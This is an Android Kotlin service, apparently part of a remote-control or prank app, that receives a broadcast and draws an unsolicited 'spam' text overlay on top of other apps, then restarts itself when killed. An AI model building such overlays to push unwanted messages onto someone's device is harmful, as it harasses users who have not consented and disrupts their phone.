package com.sync.xxx

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.util.Log
import android.util.TypedValue
import android.view.animation.DecelerateInterpolator

class DialogSpamService : Service() {

    companion object {
        const val ACTION_START = "com.sync.xxx.DIALOG_SPAM_START"
        const val ACTION_STOP  = "com.sync.xxx.DIALOG_SPAM_STOP"
        const val EXTRA_TEXT   = "text"
    }

    private var windowManager: WindowManager? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var isReady = false
    private var currentView: LinearLayout? = null
    
    // Variabel untuk mode
    private var isSpamming = false
    private var currentSpamText = ""
    private var isShowing = false

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_START -> {
                    currentSpamText = intent.getStringExtra(EXTRA_TEXT) ?: "Pesan!"
                    isSpamming = true
                    showSpamDialog()
                }
                ACTION_STOP -> stopAll()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        val filter = IntentFilter().apply {
            addAction(ACTION_START)
            addAction(ACTION_STOP)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }

        isReady = true
    }

    private fun showSpamDialog() {
        if (!isReady || isShowing || !isSpamming) return
        
        isShowing = true
        mainHandler.post {
            displayInteractiveDialog(currentSpamText)
        }
    }

    private fun displayInteractiveDialog(text: String) {
        try {
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val dp = resources.displayMetrics.density
            val screenWidth = resources.displayMetrics.widthPixels

            // Diubah menjadi WRAP_CONTENT agar kotak mengikuti ukuran teks
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.CENTER
            }

            val container = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding((20 * dp).toInt(), (20 * dp).toInt(), (20 * dp).toInt(), (20 * dp).toInt())
                background = GradientDrawable().apply {
                    setColor(Color.parseColor("#1f1f1f")) 
                    cornerRadius = 16f * dp
                    setStroke((1 * dp).toInt(), Color.parseColor("#ff4d63"))
                }
                elevation = 24f * dp
            }

            val scrollView = ScrollView(this).apply {
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT 
                )
            }

            val tv = TextView(this).apply {
                this.text = text
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 15f)
                setTextColor(Color.parseColor("#f7d9dd"))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
                // Membatasi lebar teks maksimal 80% dari lebar layar agar tidak mentok kiri-kanan
                maxWidth = (screenWidth * 0.8).toInt() 
            }
            
            scrollView.addView(tv)
            container.addView(scrollView)
            currentView = container

            container.scaleX = 0.8f
            container.scaleY = 0.8f
            container.alpha = 0f

            windowManager?.addView(container, params)

            container.animate()
                .scaleX(1f)
                .scaleY(1f)
                .alpha(1f)
                .setDuration(250)
                .setInterpolator(DecelerateInterpolator())
                .start()

        } catch (e: Exception) {
            Log.e("DialogSpam", "displayInteractiveDialog: ${e.message}")
            isShowing = false
            if (isSpamming) {
                mainHandler.postDelayed({ showSpamDialog() }, 500)
            }
        }
    }

    private fun stopAll() {
        isSpamming = false
        currentView?.let {
            try { windowManager?.removeView(it) } catch (_: Exception) {}
        }
        currentView = null
        isShowing = false
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopAll()
        isReady = false
        try { unregisterReceiver(receiver) } catch (_: Exception) {}
    }
}
